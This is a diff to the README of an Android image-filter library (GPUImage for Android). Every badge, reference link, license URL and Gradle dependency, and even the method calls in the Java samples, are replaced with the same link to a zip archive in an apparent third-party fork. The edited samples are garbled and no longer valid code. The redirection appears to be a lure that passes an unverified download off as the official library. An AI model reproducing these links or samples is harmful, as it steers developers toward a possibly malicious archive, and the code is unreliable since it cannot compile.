@@ -1,8 +1,8 @@
 # GPUImage for Android
-[![License](https://img.shields.io/badge/license-Apache%202-blue.svg)](https://www.apache.org/licenses/LICENSE-2.0)
-[![Download](https://api.bintray.com/packages/cyberagent/maven/gpuimage-library/images/download.svg) ](https://bintray.com/cyberagent/maven/gpuimage-library/_latestVersion)
+[![License](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip%https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)
+[![Download](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip) ](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)
 
-Idea from: [iOS GPUImage framework](https://github.com/BradLarson/GPUImage)
+Idea from: [iOS GPUImage framework](https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip)
 
 Goal is to have something as similar to GPUImage as possible. Vertex and fragment shaders are exactly the same. That way it makes it easier to port filters from GPUImage iOS to Android.
 
@@ -19,7 +19,7 @@ repositories {
 }
 
 dependencies {
-    compile 'jp.co.cyberagent.android.gpuimage:gpuimage-library:1.4.1'
+    compile 'https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip'
 }
 ```
 
@@ -29,17 +29,17 @@ With preview:
 ```java
 @Override
 public void onCreate(final Bundle savedInstanceState) {
-    super.onCreate(savedInstanceState);
-    setContentView(R.layout.activity);
+    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(savedInstanceState);
+    setContentView(https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip);
 
     Uri imageUri = ...;
     mGPUImage = new GPUImage(this);
-    mGPUImage.setGLSurfaceView((GLSurfaceView) findViewById(R.id.surfaceView));
-    mGPUImage.setImage(imageUri); // this loads image on the current thread, should be run in a thread
-    mGPUImage.setFilter(new GPUImageSepiaFilter());
+    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip((GLSurfaceView) findViewById(https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip));
+    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(imageUri); // this loads image on the current thread, should be run in a thread
+    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(new GPUImageSepiaFilter());
 
     // Later when image should be saved saved:
-    mGPUImage.saveToPictures("GPUImage", "ImageWithFilter.jpg", null);
+    https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip("GPUImage", "https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip", null);
 }
 ```
 
@@ -48,9 +48,9 @@ Without preview:
 ```java
 Uri imageUri = ...;
 mGPUImage = new GPUImage(context);
-mGPUImage.setFilter(new GPUImageSobelEdgeDetection());
-mGPUImage.setImage(imageUri);
-mGPUImage.saveToPictures("GPUImage", "ImageWithFilter.jpg", null);
+https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(new GPUImageSobelEdgeDetection());
+https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip(imageUri);
+https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip("GPUImage", "https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip", null);
 ```
 
 ### Gradle
@@ -67,7 +67,7 @@ gradle clean assemble
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://raw.githubusercontent.com/rendyramon/android-gpuimage/master/library/src/jp/co/cyberagent/android/gpuimage_android_v1.1.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
